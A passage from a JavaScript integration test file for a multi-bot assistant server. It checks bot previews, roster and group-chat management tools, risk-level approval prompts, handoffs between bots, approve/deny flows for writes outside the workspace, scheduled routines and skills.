    empty.json.every((bot) => bot.preview === null),
    JSON.stringify(empty.json.map((bot) => [bot.id, bot.preview])),
  );

  const cleanup = await api('/api/bots/palette', { method: 'DELETE' });
  const legacyCleanup = await api('/api/bots/legacybot', { method: 'DELETE' });
  check(
    'the avatar test bots are cleaned up',
    cleanup.status === 200 && cleanup.json.deleted === true && legacyCleanup.status === 200,
    cleanup.text,
  );
}

async function scenarioBotPreviews() {
  const list = await api('/api/bots');
  const chief = list.json.find((b) => b.id === 'chief');
  check('GET /api/bots includes a preview for a bot that has spoken', Boolean(chief?.preview) && typeof chief?.preview?.text === 'string');
  check('preview.kind is the message role', chief?.preview?.kind === 'assistant', chief?.preview?.kind);
  check('preview.ts is an ISO date', !Number.isNaN(Date.parse(chief?.preview?.ts || '')), chief?.preview?.ts);

  const messages = await api('/api/bots/chief/messages');
  const lastAssistant = [...messages.json].reverse().find((m) => m.role === 'assistant' && m.text);
  const expected = Array.from(String(lastAssistant?.text || '').replace(/\s+/g, ' ').trim())
    .slice(0, 120)
    .join('');
  checkEqual('preview is the last assistant message', chief?.preview?.text, expected);
  check(
    'preview is neither the user prompt nor a tool chip',
    chief?.preview?.text !== 'List the files in the workspace and write a note' &&
      !String(chief?.preview?.text).includes('fs_list') &&
      !String(chief?.preview?.text).includes('fs_write'),
    chief?.preview?.text,
  );
  check(
    'bots without a transcript keep preview:null',
    list.json.find((b) => b.id === 'researcher')?.preview === null && list.json.find((b) => b.id === 'ops')?.preview === null,
  );
}

// ---------------------------------------------------------------------------
// bot management tools (create / update / delete, with honest risk levels)
// ---------------------------------------------------------------------------

async function scenarioBotManagement({ approvals, botsMod, groupsMod, toolsMod }) {
  const workspaceDir = path.join(home, 'workspace');
  const registry = toolsMod.createRegistry({
    workspaceDir,
    config: {},
    getRuntime: () => {
      throw new Error('bot-management tools never start turns');
    },
    getRoutines: () => {
      throw new Error('bot-management tools never run routines');
    },
  });

  /** The context the agent would hand a tool during a chief turn. */
  const toolCtx = async (botId = 'chief') => ({
    bot: await botsMod.getBot(botId),
    config: await botsMod.loadAssistantConfig(),
    workspaceDir,
    turnId: 'turn_tool_test',
    unattended: false,
    depth: 0,
    emit: () => {},
    bots: {
      listBots: botsMod.listBots,
      getBot: botsMod.getBot,
      createBot: botsMod.createBot,
      updateBot: botsMod.updateBot,
      deleteBot: botsMod.deleteBot,
    },
    groups: groupsMod,
  });
  const ctx = await toolCtx('chief');

  // --- risk declarations: the approval boundary must stay honest -----------
  checkEqual('bot_delete is declared HIGH risk', registry.get('bot_delete').risk, 'HIGH');
  check(
    'bot_create, bot_update and group_create are MEDIUM risk',
    ['bot_create', 'bot_update', 'group_create'].every((name) => registry.get(name).risk === 'MEDIUM'),
  );
  checkEqual('group_post is LOW risk', registry.get('group_post').risk, 'LOW');

  const deleteAsk = approvals.classify('bot_delete', { id: 'ops' }, {
    baseRisk: registry.get('bot_delete').risk,
    granted: true,
    // Even a bot that auto-approves medium work must stop for a deletion.
    autoApproveMedium: true,
  });
  check('bot_delete always asks a human', deleteAsk.decision === 'ask' && deleteAsk.risk === 'HIGH', JSON.stringify(deleteAsk));

  const createAsk = approvals.classify('bot_create', { name: 'X' }, {
    baseRisk: registry.get('bot_create').risk,
    granted: true,
    autoApproveMedium: false,
  });
  check('bot_create asks a human under the default policy', createAsk.decision === 'ask', JSON.stringify(createAsk));

  const createDenied = approvals.classify('bot_create', { name: 'X' }, {
    baseRisk: registry.get('bot_create').risk,
    granted: false,
    autoApproveMedium: true,
  });
  check('a bot without the grant is denied outright, not asked', createDenied.decision === 'deny', JSON.stringify(createDenied));

  // --- the seeded grants are exactly what the Lead asked for ----------------
  const roster = (await api('/api/bots')).json;
  const chief = roster.find((b) => b.id === 'chief');
  const researcher = roster.find((b) => b.id === 'researcher');
  const ops = roster.find((b) => b.id === 'ops');
  check(
    'chief is granted roster management plus group voice',
    ['bot_create', 'bot_update', 'bot_delete', 'group_create', 'group_post'].every((name) => chief.tools.includes(name)),
    JSON.stringify(chief.tools),
  );
  check(
    'specialists may speak in groups but cannot manage the roster',
    researcher.tools.includes('group_post') &&
      ops.tools.includes('group_post') &&
      !researcher.tools.includes('bot_create') &&
      !ops.tools.includes('bot_create') &&
      !researcher.tools.includes('bot_delete') &&
      !ops.tools.includes('bot_delete') &&
      !researcher.tools.includes('group_create') &&
      !ops.tools.includes('group_create'),
    JSON.stringify({ researcher: researcher.tools, ops: ops.tools }),
  );
  check(
    'the model-facing tool schema follows the grants',
    registry.schemasFor(chief).some((s) => s.function.name === 'bot_create') &&
      registry.schemasFor(researcher).some((s) => s.function.name === 'group_post') &&
      !registry.schemasFor(researcher).some((s) => s.function.name === 'bot_delete'),
  );
  const plainBot = { id: 'plain', tools: [] };
  const plainDenied = approvals.classify('group_post', { group: 'x', text: 'hi' }, {
    baseRisk: registry.get('group_post').risk,
    granted: registry.isGranted(plainBot, 'group_post'),
    autoApproveMedium: true,
  });
  check(
    'a bot without group_post gets the normal not-granted denial',
    registry.isGranted(plainBot, 'group_post') === false && plainDenied.decision === 'deny',
    JSON.stringify(plainDenied),
  );

  // --- create ---------------------------------------------------------------
  const created = await registry.get('bot_create').run(
    { name: 'Note Keeper', role: 'keeps the notes', tools: ['fs_read'] },
    ctx,
  );
  check('bot_create creates a bot', created?.created === true && created?.bot?.id === 'note-keeper', JSON.stringify(created));
  const afterCreate = (await api('/api/bots')).json.find((b) => b.id === 'note-keeper');
  check(
    'the new bot appears in GET /api/bots with its role and grants',
    afterCreate?.role === 'keeps the notes' && afterCreate.tools.includes('fs_read'),
    JSON.stringify(afterCreate),
  );
  const duplicate = await errorCode(() => registry.get('bot_create').run({ name: 'Note Keeper' }, ctx));
  checkEqual('creating the same bot twice is refused', duplicate, 'BOT_EXISTS');

  // --- update ---------------------------------------------------------------
  const updated = await registry.get('bot_update').run(
    { id: 'note-keeper', name: 'Note Archivist', role: 'archives the notes' },
    ctx,
  );
  check(
    'bot_update changes name and role',
    updated?.bot?.name === 'Note Archivist' && updated?.bot?.role === 'archives the notes',
    JSON.stringify(updated),
  );
  const afterUpdate = (await api('/api/bots')).json.find((b) => b.id === 'note-keeper');
  check('the rename is visible over HTTP', afterUpdate?.name === 'Note Archivist', afterUpdate?.name);
  const nothing = await errorCode(() => registry.get('bot_update').run({ id: 'note-keeper' }, ctx));
  checkEqual('bot_update with no fields is refused', nothing, 'BOT_NOTHING_TO_UPDATE');

  // --- delete, including the primary guard ---------------------------------
  const protectedError = await errorCode(() => registry.get('bot_delete').run({ id: 'chief' }, ctx));
  checkEqual('bot_delete refuses the primary bot', protectedError, 'BOT_PRIMARY_PROTECTED');
  check('the primary bot is still on the roster', (await api('/api/bots')).json.some((b) => b.id === 'chief'));

  const deleted = await registry.get('bot_delete').run({ id: 'note-keeper' }, ctx);
  check('bot_delete removes the bot', deleted?.deleted === true, JSON.stringify(deleted));
  check('the deleted bot is gone from GET /api/bots', !(await api('/api/bots')).json.some((b) => b.id === 'note-keeper'));

  // --- group_create validation through the tool -----------------------------
  const oneMember = await errorCode(() => registry.get('group_create').run({ name: 'Too Small', members: ['chief'] }, ctx));
  checkEqual('group_create rejects one member', oneMember, 'GROUP_MEMBER_COUNT');
  const sevenMembers = await errorCode(() =>
    registry.get('group_create').run({ name: 'Too Big', members: ['a', 'b', 'c', 'd', 'e', 'f', 'g'] }, ctx),
  );
  checkEqual('group_create rejects seven members', sevenMembers, 'GROUP_MEMBER_COUNT');
  const badCoordinator = await errorCode(() =>
    registry.get('group_create').run({ name: 'Bad Chair', members: ['chief', 'researcher'], coordinator: 'ops' }, ctx),
  );
  checkEqual('group_create requires the coordinator to be a member', badCoordinator, 'GROUP_BAD_COORDINATOR');
  const unknownMember = await errorCode(() =>
    registry.get('group_create').run({ name: 'Ghosts', members: ['chief', 'ghost-bot'] }, ctx),
  );
  checkEqual('group_create rejects unknown members', unknownMember, 'GROUP_UNKNOWN_MEMBER');

  const createdGroup = await registry.get('group_create').run({ name: 'Ops Room', members: ['chief', 'ops'] }, ctx);
  check(
    'group_create creates a 2-member group and defaults the coordinator to the first member',
    createdGroup?.created === true &&
      createdGroup?.group?.members?.length === 2 &&
      createdGroup?.group?.coordinatorId === 'chief',
    JSON.stringify(createdGroup),
  );
  const opsRoom = (await api('/api/groups')).json.find((g) => g.id === createdGroup?.group?.id);
  check('the tool-created group appears in GET /api/groups', Boolean(opsRoom) && opsRoom.members.length === 2);
  await api(`/api/groups/${createdGroup.group.id}`, { method: 'DELETE' });
}

// ---------------------------------------------------------------------------
// group chats (API + one real coordinator turn under the mock provider)
// ---------------------------------------------------------------------------

async function scenarioGroups({ botsMod, groupsMod, toolsMod }) {
  const workspaceDir = path.join(home, 'workspace');
  const registry = toolsMod.createRegistry({
    workspaceDir,
    config: {},
    getRuntime: () => {
      throw new Error('group tools never start turns');
    },
    getRoutines: () => {
      throw new Error('group tools never run routines');
    },
  });
  const toolCtx = async (botId) => ({
    bot: await botsMod.getBot(botId),
    config: await botsMod.loadAssistantConfig(),
    workspaceDir,
    turnId: 'turn_group_tool_test',
    unattended: false,
    depth: 0,
    emit: () => {},
    bots: {
      listBots: botsMod.listBots,
      getBot: botsMod.getBot,
      createBot: botsMod.createBot,
      updateBot: botsMod.updateBot,
      deleteBot: botsMod.deleteBot,
    },
    groups: groupsMod,
  });

  // A coordinator bot with the group tools, so this scenario does not depend on
  // the seed roster's grants.
  await api('/api/bots', {
    method: 'POST',
    body: { name: 'Steward', role: 'runs group turns', tools: ['bot_list', 'bot_message', 'group_post', 'task_finish'] },
  });

  // --- member-count and coordinator validation ------------------------------
  const oneMember = await api('/api/groups', { method: 'POST', body: { name: 'Solo', members: ['steward'] } });
  check(
    'POST /api/groups rejects a one-member group',
    oneMember.status === 400 && oneMember.json?.error?.code === 'GROUP_MEMBER_COUNT',
    oneMember.text,
  );
  const sevenMembers = await api('/api/groups', {
    method: 'POST',
    body: { name: 'Crowd', members: ['a', 'b', 'c', 'd', 'e', 'f', 'g'] },
  });
  check(
    'POST /api/groups rejects a seven-member group',
    sevenMembers.status === 400 && sevenMembers.json?.error?.code === 'GROUP_MEMBER_COUNT',
    sevenMembers.text,
  );
  const badCoordinator = await api('/api/groups', {
    method: 'POST',
    body: { name: 'Bad Chair', members: ['steward', 'researcher'], coordinatorId: 'ops' },
  });
  check(
    'POST /api/groups requires the coordinator to be a member',
    badCoordinator.status === 400 && badCoordinator.json?.error?.code === 'GROUP_BAD_COORDINATOR',
    badCoordinator.text,
  );
  const unknownMember = await api('/api/groups', {
    method: 'POST',
    body: { name: 'Ghosts', members: ['steward', 'ghost-bot'] },
  });
  check(
    'POST /api/groups rejects unknown members',
    unknownMember.status === 400 && unknownMember.json?.error?.code === 'GROUP_UNKNOWN_MEMBER',
    unknownMember.text,
  );

  // --- create + list --------------------------------------------------------
  const created = await api('/api/groups', {
    method: 'POST',
    body: { name: 'Release Room', members: ['steward', 'researcher', 'ops'], coordinatorId: 'steward' },
  });
  const groupId = created.json?.group?.id;
  check(
    'POST /api/groups creates a group',
    created.status === 200 && created.json?.group?.members?.length === 3 && created.json.group.coordinatorId === 'steward',
    created.text,
  );
  check(
    'group members are projected to objects with id, name, role and avatar',
    created.json?.group?.members?.every((m) => m.id && m.name && typeof m.role === 'string' && m.avatar?.shape),
    JSON.stringify(created.json?.group?.members),
  );
  const listed = await api('/api/groups');
  const listedGroup = listed.json.find((g) => g.id === groupId);
  check('GET /api/groups lists the group with preview:null', Boolean(listedGroup) && listedGroup.preview === null, listed.text.slice(0, 240));
  const single = await api(`/api/groups/${groupId}`);
  check(
    'GET /api/groups/:id returns the same group',
    single.status === 200 && single.json?.group?.id === groupId && single.json.group.members.length === 3,
    single.text.slice(0, 200),
  );

  // Chinese group names slugify to nothing; the id still has to be distinct and
  // readable instead of group / group-2.
  const cnOne = await api('/api/groups', { method: 'POST', body: { name: '小熊学滑冰', members: ['steward', 'researcher'] } });
  const cnTwo = await api('/api/groups', { method: 'POST', body: { name: '周末值班', members: ['steward', 'researcher'] } });
  const cnIdOne = cnOne.json?.group?.id || '';
  const cnIdTwo = cnTwo.json?.group?.id || '';
  check(
    'a group with a Chinese name gets a short random id, not the word "group"',
    /^g-[a-z0-9]{6}$/.test(cnIdOne) && /^g-[a-z0-9]{6}$/.test(cnIdTwo),
    `${cnIdOne} / ${cnIdTwo}`,
  );
  check('two Chinese-named groups get different ids', cnIdOne && cnIdTwo && cnIdOne !== cnIdTwo, `${cnIdOne} vs ${cnIdTwo}`);
  await api(`/api/groups/${cnIdOne}`, { method: 'DELETE' });
  await api(`/api/groups/${cnIdTwo}`, { method: 'DELETE' });

  // --- patch ----------------------------------------------------------------
  const renamed = await api(`/api/groups/${groupId}`, { method: 'PATCH', body: { name: 'Release Room 2' } });
  check('PATCH /api/groups renames the group', renamed.json?.group?.name === 'Release Room 2', renamed.text);
  const badPatch = await api(`/api/groups/${groupId}`, { method: 'PATCH', body: { coordinatorId: 'chief' } });
  check(
    'PATCH rejects a coordinator who is not a member',
    badPatch.status === 400 && badPatch.json?.error?.code === 'GROUP_BAD_COORDINATOR',
    badPatch.text,
  );
  const dropped = await api(`/api/groups/${groupId}`, { method: 'PATCH', body: { members: ['steward', 'researcher'] } });
  check(
    'PATCH can drop a member',
    dropped.json?.group?.members?.map((m) => m.id).join(',') === 'steward,researcher',
    dropped.text,
  );
  const twin = await api('/api/groups', { method: 'POST', body: { name: 'Release Room', members: ['steward', 'ops'] } });
  check(
    'a second group with the same name gets its own id',
    twin.status === 200 && Boolean(twin.json?.group?.id) && twin.json.group.id !== groupId,
    twin.text.slice(0, 200),
  );
  await api(`/api/groups/${twin.json.group.id}`, { method: 'DELETE' });

  // --- a real group turn: POST -> SSE -> transcript -------------------------
  const stream = await openStream('', { groupId });
  let posted;
  let end;
  try {
    posted = await api(`/api/groups/${groupId}/message`, {
      method: 'POST',
      body: { text: '大家好，先对一下今天的进度。' },
    });
    check('POST /api/groups/:id/message returns a turnId', posted.status === 200 && Boolean(posted.json?.turnId), posted.text);
    end = await stream.waitFor(
      (event) => event.type === 'turn.end' && event.turnId === posted.json.turnId,
      20000,
      'group turn.end',
    );
    check('the coordinator turn completes', end.status === 'success', end.status);
  } finally {
    stream.close();
  }
  const turnEvents = stream.events.filter((event) => event.turnId === posted.json.turnId);
  check('the group turn streamed events', turnEvents.length > 1, `${turnEvents.length} events`);
  // App-wide notices (roster, settings, sidebar status, Feishu) reach every window by design.
  const APP_WIDE = new Set(['roster.changed', 'ui.command', 'settings.changed', 'attention.changed', 'feishu.changed']);
  check('every event on a ?groupId stream carries that groupId', stream.events.length > 0 && stream.events.filter((e) => !APP_WIDE.has(e.type)).every((e) => e.groupId === groupId));
  const postedEvent = stream.events.find((event) => event.type === 'group.message' && event.message?.from === 'steward');
  check('SSE carries a group.message posted by the coordinator', Boolean(postedEvent), JSON.stringify(stream.events.map((e) => e.type)));

  const transcript = await api(`/api/groups/${groupId}/messages`);
  const items = transcript.json;
  check(
    'the transcript starts with the human message',
    items[0]?.kind === 'user' && items[0]?.from === 'user' && items[0]?.text === '大家好，先对一下今天的进度。',
    JSON.stringify(items[0]),
  );
  check(
    'the transcript contains an assistant reply from the coordinator',
    items.some((m) => m.kind === 'assistant' && m.from === 'steward' && typeof m.text === 'string' && m.text.length > 0),
    JSON.stringify(items.map((m) => [m.kind, m.from])),
  );
  check(
    'the group_post tool call is visible as a tool row',
    items.some((m) => m.kind === 'tool' && m.name === 'group_post'),
    JSON.stringify(items.filter((m) => m.kind === 'tool')),
  );
  check(
    'the coordinator pulled a teammate in with bot_message',
    items.some((m) => m.kind === 'tool' && m.name === 'bot_message'),
    JSON.stringify(items.filter((m) => m.kind === 'tool').map((m) => m.name)),
  );
  check(
    'the teammate answered in the group itself, not only privately',
    items.some((m) => m.kind === 'assistant' && m.from === 'researcher'),
    JSON.stringify(items.map((m) => [m.kind, m.from])),
  );
  check(
    'the teammate speaking is streamed to the group',
    stream.events.some((event) => event.type === 'group.message' && event.message?.from === 'researcher'),
    JSON.stringify(stream.events.filter((e) => e.type === 'group.message').map((e) => e.message?.from)),
  );
  check(
    'the transcript ends with a status row for the turn',
    items.at(-1)?.kind === 'status' && items.at(-1)?.status === 'success',
    JSON.stringify(items.at(-1)),
  );
  check('every transcript row has an id and an ISO timestamp', items.every((m) => typeof m.id === 'string' && !Number.isNaN(Date.parse(m.ts))));
  check(
    'the transcript text is the exact text the coordinator posted',
    postedEvent ? items.find((m) => m.id === postedEvent.message.id)?.text === postedEvent.message.text : false,
  );

  const groupLog = await fsp.readFile(path.join(home, 'data', 'groups', `${groupId}.jsonl`), 'utf8');
  check(
    'group messages are appended to data/groups/<id>.jsonl',
    groupLog.split('\n').filter(Boolean).length === items.length && groupLog.includes('"kind":"assistant"') && groupLog.includes('group_post'),
    `${groupLog.split('\n').filter(Boolean).length} lines`,
  );

  const afterTurn = (await api('/api/groups')).json.find((g) => g.id === groupId);
  const lastMeaningful = [...items].reverse().find((m) => m.kind === 'user' || m.kind === 'assistant');
  const expectedPreview = lastMeaningful
    ? {
        text: Array.from(String(lastMeaningful.text).replace(/\s+/g, ' ').trim()).slice(0, 120).join(''),
        ts: lastMeaningful.ts,
        from: lastMeaningful.from,
      }
    : null;
  checkEqual('the group preview is the last meaningful message', afterTurn?.preview, expectedPreview);
  check(
    'the group preview names a real sender',
    afterTurn?.preview?.from === 'steward' || afterTurn?.preview?.from === 'researcher',
    JSON.stringify(afterTurn?.preview),
  );

  // --- a member can speak in the group; a non-member cannot ----------------
  const memberCtx = await toolCtx('researcher');
  const memberPost = await registry
    .get('group_post')
    .run({ group: groupId, text: 'Researcher here: sources checked, digest written.' }, memberCtx);
  check('a member bot can post with group_post', memberPost?.posted === true, JSON.stringify(memberPost));
  const afterMember = await api(`/api/groups/${groupId}/messages`);
  check(
    'the member message lands in the transcript attributed to it',
    afterMember.json.some(
      (m) => m.kind === 'assistant' && m.from === 'researcher' && m.text.includes('Researcher here'),
    ),
  );
  const outsiderCtx = await toolCtx('ops');
  const outsider = await errorCode(() =>
    registry.get('group_post').run({ group: groupId, text: 'should not land' }, outsiderCtx),
  );
  checkEqual('a non-member cannot post in the group', outsider, 'GROUP_MEMBER_REQUIRED');
  check(
    'the refused post left no trace',
    !(await api(`/api/groups/${groupId}/messages`)).json.some((m) => m.text === 'should not land'),
  );

  // --- deleting a bot repairs the groups it sat in -------------------------
  await api('/api/bots', { method: 'POST', body: { name: 'Temp Chair', role: 'temporary', tools: ['group_post'] } });
  const repairGroup = await api('/api/groups', {
    method: 'POST',
    body: { name: 'Repair Room', members: ['temp-chair', 'steward', 'researcher'], coordinatorId: 'temp-chair' },
  });
  const repairId = repairGroup.json?.group?.id;
  const seatsBefore = repairGroup.json?.group?.members?.map((m) => m.id).join(',');
  const removal = await api('/api/bots/temp-chair', { method: 'DELETE' });
  check(
    'DELETE /api/bots reports the groups it repaired',
    removal.json?.groupsRepaired?.some((g) => g.id === repairId),
    JSON.stringify(removal.json?.groupsRepaired),
  );
  const repaired = (await api('/api/groups')).json.find((g) => g.id === repairId);
  check(
    'the deleted bot left the group roster',
    repaired?.members?.every((m) => m.id !== 'temp-chair') && repaired?.members?.length === 2,
    `${seatsBefore} -> ${repaired?.members?.map((m) => m.id).join(',')}`,
  );
  check('a coordinator seat is promoted to a remaining member', repaired?.coordinatorId === 'steward', repaired?.coordinatorId);
  await api(`/api/groups/${repairId}`, { method: 'DELETE' });

  // --- a group that drops below two members keeps an honest state ----------
  await api('/api/bots', { method: 'POST', body: { name: 'Solo Member', role: 'temporary' } });
  const tiny = await api('/api/groups', { method: 'POST', body: { name: 'Tiny Room', members: ['steward', 'solo-member'] } });
  const tinyId = tiny.json?.group?.id;
  await api('/api/bots/solo-member', { method: 'DELETE' });
  const tinyAfter = (await api('/api/groups')).json.find((g) => g.id === tinyId);
  check(
    'a group that lost a member keeps the remaining one',
    tinyAfter?.members?.length === 1 && tinyAfter.members[0].id === 'steward',
    JSON.stringify(tinyAfter?.members),
  );
  const blocked = await api(`/api/groups/${tinyId}/message`, { method: 'POST', body: { text: 'anyone there?' } });
  check(
    'a one-member group refuses to run with GROUP_TOO_SMALL',
    blocked.status === 409 && blocked.json?.error?.code === 'GROUP_TOO_SMALL',
    blocked.text,
  );
  const revived = await api(`/api/groups/${tinyId}`, { method: 'PATCH', body: { members: ['steward', 'researcher'] } });
  check('PATCH can revive a group by adding a member', revived.status === 200 && revived.json?.group?.members?.length === 2, revived.text);
  await api(`/api/groups/${tinyId}`, { method: 'DELETE' });

  // --- delete the group -----------------------------------------------------
  const removedGroup = await api(`/api/groups/${groupId}`, { method: 'DELETE' });
  check(
    'DELETE /api/groups/:id deletes the group',
    removedGroup.status === 200 && removedGroup.json?.ok === true && removedGroup.json?.deleted === true,
    removedGroup.text,
  );
  const goneMessages = await api(`/api/groups/${groupId}/messages`);
  check(
    'a deleted group has no transcript endpoint',
    goneMessages.status === 404 && goneMessages.json?.error?.code === 'GROUP_NOT_FOUND',
    goneMessages.text,
  );
  const transcriptStillThere = await fsp
    .stat(path.join(home, 'data', 'groups', `${groupId}.jsonl`))
    .then(() => true)
    .catch(() => false);
  check('the transcript file is removed with the group', transcriptStillThere === false);
  check('an unknown group is a 404', (await api('/api/groups/nope')).status === 404);

  // --- cleanup --------------------------------------------------------------
  await api('/api/bots/steward', { method: 'DELETE' });
  const remaining = (await api('/api/bots')).json.map((b) => b.id).sort().join(',');
  check('the group test bots are cleaned up', remaining === 'chief,ops,researcher', remaining);
}

async function scenarioChiefTurn() {
  const stream = await openStream('chief');
  let turn;
  try {
    turn = await runTurn('chief', 'List the files in the workspace and write a note', stream);
  } finally {
    stream.close();
  }

  check('chief turn completes', turn.status === 'success', turn.status);
  const types = new Set(turn.events.map((e) => e.type));
  for (const type of ['turn.start', 'tool.call', 'tool.result', 'message', 'turn.end']) {
    check(`SSE emitted ${type}`, types.has(type), [...types].join(','));
  }
  const toolNames = turn.events.filter((e) => e.type === 'tool.call').map((e) => e.name);
  check('chief called fs_list then fs_write then memory_write', ['fs_list', 'fs_write', 'memory_write'].every((n) => toolNames.includes(n)), toolNames.join(','));
  const deltas = turn.events.filter((e) => e.type === 'message.delta');
  check('assistant text was streamed as deltas', deltas.length >= 1);

  const planFile = path.join(home, 'workspace', 'notes', 'plan.md');
  const wrote = await fsp.readFile(planFile, 'utf8').catch(() => null);
  check('fs_write created workspace/notes/plan.md on disk', Boolean(wrote) && wrote.includes('# Plan'), String(wrote).slice(0, 60));

  const memFile = path.join(home, 'data', 'memory', 'chief', 'MEMORY.md');
  const mem = await fsp.readFile(memFile, 'utf8').catch(() => '');
  check('memory_write appended to the per-bot MEMORY.md', mem.includes('workspace sweep'), mem.slice(-120));

  const memoryApi = await api('/api/bots/chief/memory');
  check('GET /api/bots/:id/memory returns entries', memoryApi.status === 200 && memoryApi.json.entries.length >= 1);

  const messages = await api('/api/bots/chief/messages');
  const roles = new Set(messages.json.map((m) => m.role));
  check('message log has user, tool and assistant items', ['user', 'tool', 'assistant'].every((r) => roles.has(r)), [...roles].join(','));
  check('tool chips carry a risk classification', messages.json.filter((m) => m.role === 'tool').every((m) => typeof m.risk === 'string' && m.risk.length > 0));

  const audit = await api('/api/audit?limit=100');
  check('audit log records tool runs', audit.status === 200 && audit.json.some((a) => a.kind === 'tool.run'));
}

async function scenarioHandoff() {
  const stream = await openStream('chief');
  let turn;
  try {
    turn = await runTurn('chief', 'Hand off to the researcher: summarise welcome.md for me', stream);
  } finally {
    stream.close();
  }

  check('handoff turn completes', turn.status === 'success', turn.status);
  const messageCall = turn.events.find((e) => e.type === 'tool.call' && e.name === 'bot_message');
  check('chief used bot_message to hand off', Boolean(messageCall), turn.events.map((e) => e.name).join(','));
  const messageResult = turn.events.find((e) => e.type === 'tool.result' && e.name === 'bot_message');
  check(
    'the researcher actually ran and replied',
    messageResult?.result?.status === 'success' && String(messageResult?.result?.reply || '').length > 0,
    JSON.stringify(messageResult?.result || {}).slice(0, 160),
  );

  const researcherMessages = await api('/api/bots/researcher/messages');
  check('researcher kept its own separate conversation', researcherMessages.json.some((m) => m.role === 'tool' && m.name === 'fs_read'));
}

async function scenarioApprovalApprove() {
  const stream = await openStream('ops');
  try {
    const post = await api('/api/bots/ops/message', {
      method: 'POST',
      body: { text: 'Write a note outside the workspace: alpha' },
    });
    check('ops message accepted', post.status === 200 && Boolean(post.json.turnId), post.text);

    const request = await stream.waitFor((e) => e.type === 'approval.request', 10000, 'approval.request');
    check('writing outside the workspace raised an approval card', request.risk === 'HIGH', request.risk);

    const pending = await api('/api/approvals?status=pending');
    const card = pending.json.find((a) => a.id === request.approvalId);
    check('GET /api/approvals?status=pending lists the card', Boolean(card), pending.text.slice(0, 200));
    check('approval card carries tool, args and reason', Boolean(card?.toolName) && Boolean(card?.args) && Boolean(card?.reason));

    const decision = await api(`/api/approvals/${request.approvalId}`, {
      method: 'POST',
      body: { decision: 'approve', note: 'smoke test' },
    });
    check('POST /api/approvals/:id approves', decision.status === 200 && decision.json.approval.status === 'approved');

    const end = await stream.waitFor((e) => e.type === 'turn.end' && e.turnId === post.json.turnId, 15000, 'turn.end after approval');
    check('turn resumes and finishes after approval', end.status === 'success', end.status);

    const outside = path.join(home, 'outside-note.md');
    const content = await fsp.readFile(outside, 'utf8').catch(() => '');
    check('approved write landed outside the workspace', content.includes('alpha'), content.slice(0, 80));

    const audit = await api('/api/audit?limit=200');
    check(
      'audit log records the approval decision',
      audit.json.some((a) => a.kind === 'approval.resolved' && a.status === 'approved'),
    );
  } finally {
    stream.close();
  }
}

async function scenarioApprovalDeny() {
  const stream = await openStream('ops');
  try {
    const post = await api('/api/bots/ops/message', {
      method: 'POST',
      body: { text: 'Write a note outside the workspace: beta' },
    });
    const request = await stream.waitFor((e) => e.type === 'approval.request', 10000, 'second approval.request');

    const decision = await api(`/api/approvals/${request.approvalId}`, {
      method: 'POST',
      body: { decision: 'deny', note: 'not now' },
    });
    check('deny is recorded', decision.status === 200 && decision.json.approval.status === 'denied');

    const end = await stream.waitFor((e) => e.type === 'turn.end' && e.turnId === post.json.turnId, 10000, 'turn.end after deny');
    check('denied tool does not fail the whole turn', end.status === 'success', end.status);

    const anyDenied = stream.events.some((e) => e.type === 'tool.result' && e.result?.error?.code === 'APPROVAL_DENIED');
    check('tool result reports APPROVAL_DENIED back to the model', anyDenied, 'no APPROVAL_DENIED result');

    const outside = await fsp.readFile(path.join(home, 'outside-note.md'), 'utf8').catch(() => '');
    check('denied write did NOT touch the file', !outside.includes('beta'), outside.slice(0, 80));

    const audit = await api('/api/audit?limit=200');
    check('audit log records the denial', audit.json.some((a) => a.kind === 'approval.resolved' && a.status === 'denied'));
  } finally {
    stream.close();
  }
}

async function scenarioRoutineNeedsApproval() {
  const created = await api('/api/routines', {
    method: 'POST',
    body: {
      botId: 'ops',
      name: 'Nightly outside write',
      instruction: 'Write a note outside the workspace: gamma',
      schedule: 'every 60 minutes',
      enabled: true,
    },
  });
  check('POST /api/routines creates a routine', created.status === 200 && Boolean(created.json.routine.id), created.text);
  const routineId = created.json.routine.id;
  check('routine has a computed nextRun', Boolean(created.json.routine.nextRun), JSON.stringify(created.json.routine));
  check('routine stores its timezone', Boolean(created.json.routine.timezone));

  const tested = await api(`/api/routines/${routineId}/test`, { method: 'POST', body: {} });
  check('POST /api/routines/:id/test runs immediately', tested.status === 200 && Boolean(tested.json.run));
  check(
    'unattended run stops as needs_approval instead of hanging',
    tested.json?.run?.status === 'needs_approval',
    JSON.stringify(tested.json?.run || {}).slice(0, 200),
  );

  const opsMessages = await api('/api/bots/ops/messages');
  check(
    'chat explains that the routine is paused for approval',
    opsMessages.json.some((m) => String(m.text || '').toLowerCase().includes('paused')),
  );

  const list = await api('/api/routines');
  const listed = list.json.find((r) => r.id === routineId);
  check('routine history records the needs_approval run', listed?.runs?.some((r) => r.status === 'needs_approval'));

  const disabled = await api(`/api/routines/${routineId}`, { method: 'PATCH', body: { enabled: false } });
  check('PATCH /api/routines/:id can disable it', disabled.status === 200 && disabled.json.routine.enabled === false);
  check('a disabled routine has no nextRun', !disabled.json.routine.nextRun);

  const removed = await api(`/api/routines/${routineId}`, { method: 'DELETE' });
  check('DELETE /api/routines/:id removes it', removed.status === 200);
}

async function scenarioRoutineSuccess() {
  const created = await api('/api/routines', {
    method: 'POST',
    body: {
      botId: 'chief',
      name: 'Morning read',
      instruction: 'Read welcome.md and summarise it',
      schedule: '0 9 * * 1-5',
      timezone: 'Asia/Shanghai',
      enabled: true,
    },
  });
  check('cron-scheduled routine accepted', created.status === 200 && created.json.routine.kind === 'cron', created.text);
  const next = new Date(created.json.routine.nextRun);
  check('cron nextRun is a real future instant', next instanceof Date && next.getTime() > Date.now());

  const tested = await api(`/api/routines/${created.json.routine.id}/test`, { method: 'POST', body: {} });
  check('a safe routine test succeeds', tested.json?.run?.status === 'success', JSON.stringify(tested.json?.run || {}).slice(0, 200));
  check('test run is appended to history', tested.json?.routine?.runs?.length >= 1);
}

async function scenarioSkillSaveViaBot() {
  const before = await api('/api/skills');
  check('GET /api/skills lists the 4 starter skills', before.status === 200 && before.json.length >= 4, `got ${before.json?.length}`);
  check(
    'skills expose frontmatter fields',
    before.json.every((s) => s.name && s.description && Array.isArray(s.steps) && s.validation && s.approval_notes),
  );

  const one = await api('/api/skills/workspace-sweep');
  check('GET /api/skills/:name returns steps', one.status === 200 && one.json.skill.steps.length >= 3, one.text.slice(0, 120));

  const stream = await openStream('researcher');
  try {
    const turn = await runTurn('researcher', 'Save this as a skill called inbox-triage: sort the inbox and write top three', stream);
    check('researcher turn completes', turn.status === 'success', turn.status);
